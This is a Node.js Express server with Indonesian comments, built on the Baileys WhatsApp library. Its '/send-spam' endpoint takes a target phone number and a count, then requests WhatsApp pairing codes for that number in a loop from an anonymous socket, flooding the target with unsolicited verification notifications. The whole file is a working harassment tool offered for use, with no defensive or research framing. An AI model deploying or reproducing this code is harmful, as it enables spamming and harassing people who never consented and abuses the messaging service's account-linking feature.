const { default: makeWASocket } = require("@whiskeysockets/baileys");
const pino = require('pino');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path'); // Import modul 'path'

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(express.static('.'));

// Fungsi untuk membuat instance soket TANPA autentikasi
async function createAnonymousSocket() {
    const sock = makeWASocket({
        logger: pino({ level: "info" }),
        printQRInTerminal: false, // Tidak perlu QR code
        // Tidak perlu 'auth' karena kita tidak menggunakan autentikasi
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    return sock;
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html')); // Kirim file index.html
});

app.post('/send-spam', async (req, res) => {
    const { phoneNumber, spamCount } = req.body;

    if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
        return res.status(400).json({ error: 'Nomor telepon tidak valid.' });
    }
    if (!Number.isInteger(spamCount) || spamCount <= 0) {
        return res.status(400).json({ error: 'Jumlah spam tidak valid.' });
    }

    const results = [];
    const sock = await createAnonymousSocket(); // Buat soket baru setiap kali ada request

    for (let i = 0; i < spamCount; i++) {
        try {
            let code = await sock.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            results.push({ success: true, code });
        } catch (error) {
            let errorMessage = error.message;
            if (errorMessage.includes("can't send message to this number")) {
                errorMessage = "Tidak dapat mengirim pesan ke nomor ini (mungkin diblokir atau bukan pengguna WA).";
            } else if (errorMessage.includes("timed out")) {
                errorMessage = "Waktu permintaan habis. Coba lagi nanti.";
            } else if(errorMessage.includes("cannot use this device")){
                errorMessage = "Tidak bisa melakukan pairing, tunggu beberapa saat!"

            } else if (errorMessage.includes("404")) {
                errorMessage = "Nomor tidak ditemukan.";
            }
             // Tambahkan penanganan kesalahan lain yang lebih spesifik di sini
            results.push({ success: false, error: errorMessage });
        }
    }

    // Tutup koneksi setelah selesai (penting!)
    sock.end(); // Menutup koneksi secara eksplisit

    res.json({ results });
});

app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});
